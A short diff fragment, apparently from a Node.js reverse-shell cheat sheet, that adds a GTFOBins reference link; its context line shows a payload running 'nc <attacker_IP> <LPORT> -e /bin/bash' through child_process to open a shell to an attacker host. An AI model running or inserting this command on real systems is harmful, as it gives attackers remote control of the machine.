@@ -34,3 +34,5 @@ x('child_process').exec('nc <attacker_IP> <LPORT> -e /bin/bash')
 ## References
 
 - [0x4ndr3: JSgen](https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py)
+
+- [GTFOBins: NodeJS]
